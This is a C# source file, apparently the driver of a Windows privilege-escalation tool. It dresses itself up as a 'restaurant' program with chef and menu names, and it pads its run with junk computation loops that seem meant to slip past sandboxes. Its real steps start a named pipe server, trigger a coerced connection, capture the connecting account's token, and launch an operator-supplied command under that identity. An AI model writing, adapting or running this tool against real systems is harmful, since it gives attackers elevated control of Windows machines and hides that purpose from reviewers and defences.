using System;
using System.IO;
using System.Diagnostics;
using Cutexe.NativeAPI;
using System.Security.Principal;
using System.Threading;
using Twokens;
using static Cutexe.ArgsParse;

namespace Cutexe
{
    internal class Program
    {

        class Gargs
        {
            [ArgsAttribute("chef","chef2",Description = "CommandLine",Required = true)]
            public string cmd { get; set; }
        }

        public static int CountPrimes() {
            int count = 0;
            for (int i = 2; i < 200_0000; i++)  {
                bool isPrime = true;
                for (int j = 2; j <= Math.Sqrt(i); j++)
                    if (i % j == 0) { isPrime = false; break; }
                    if (isPrime) count++;
            }
            return count;
        }

        public static int SumOfSquares() {
        int sum = 0;
        for (int i = 1; i < 60; i++)   {
            sum += i * i;
            Thread.Sleep(i);
        }
        return sum;
        }

        static void WarmUpKitchen() {
    Console.WriteLine("Warming up the kitchen...");

    int dishes = 0;
    for (int i = 0; i < 5_000_000; i++) {
        dishes += i % 3;
        dishes ^= (dishes << 1);
    }

    string[] fakeMenu = new string[] { "Soup", "Salad", "Steak", "Dessert", "Biryani", "Veg", "Puri", "Chapati" };
    foreach (var dish in fakeMenu) {
        if (dish.Length > 0) {
            dishes += dish.Length;
        }
    }

    for (int i = 0; i < 10; i++) {
        dishesWorker(i);
    }

    Console.WriteLine("Kitchen ready. Dishes: " + dishes);
}

static void dishesWorker(int id) {
    int val = id;
    for (int i = 0; i < 1_000_000; i++) {
        val += i % 2;
    }
}

static void MenuCard() {
    for (int i = 0; i < 50; i++) {
        if (i % 10 == 0) {
            Console.WriteLine($"Card: step {i}");
        }
    }
}




        static void Main(string[] args)
        {
            TextWriter ConsoleWriter = Console.Out;

            Gargs pargs;

            WarmUpKitchen();

            if (args.Length == 0)
            {
                ConsoleWriter.WriteLine("This is a restaurant , ask -chef");
                return;
            }
            else
            {
                try
                {
                    pargs = ParseArgs<Gargs>(args);
                }
                catch (Exception e)
                {
                    Environment.Exit(0);
                    if (e.InnerException != null)
                    {
                        e = e.InnerException;
                    }
                    ConsoleWriter.WriteLine("Exceptional !! ");
                    return;
                }
            }

            try
            {


                Stopwatch sw = Stopwatch.StartNew();

                if(true) {
                    // Thread.Sleep(2000);
                    ConsoleWriter.WriteLine("Counting.....");
                    CountPrimes();
                    Console.WriteLine($"CountPrimes: ({sw.Elapsed})");
                    sw.Restart();
                    MenuCard();

                    // Environment.Exit(0);
                }

                CutexeContext gpc = new CutexeContext(ConsoleWriter, Guid.NewGuid().ToString());

                gpc.chefsArePeeSee();
                ConsoleWriter.WriteLine("[*] pipe server started");
                gpc.OpenUpRestaraunt();
                SumOfSquares();
                Console.WriteLine($"SumOfSquares: ({sw.Elapsed})");
                sw.Restart();

                gpuTrigger uT = new gpuTrigger(gpc);
                try
                {
                    int hr = uT.GetReadyToOpen();
                }
                catch (Exception e)
                {
                    ConsoleWriter.WriteLine("something went wrong");
                }


                WindowsIdentity sysId = gpc.GetCustomerToken();
                if (sysId != null)
                {
                    ConsoleWriter.WriteLine("[*] Me : " + sysId.Name);
                    TokenuUils.createProcessReadOut(ConsoleWriter, sysId.Token, pargs.cmd);

                }
                else
                {
                    ConsoleWriter.WriteLine("[!] restaurant close");
                }
                gpc.Restore();
                gpc.Stop();
            }
            catch (Exception e)
            {
                ConsoleWriter.WriteLine("[!] " + e.Message);
            }
        }
    }
}
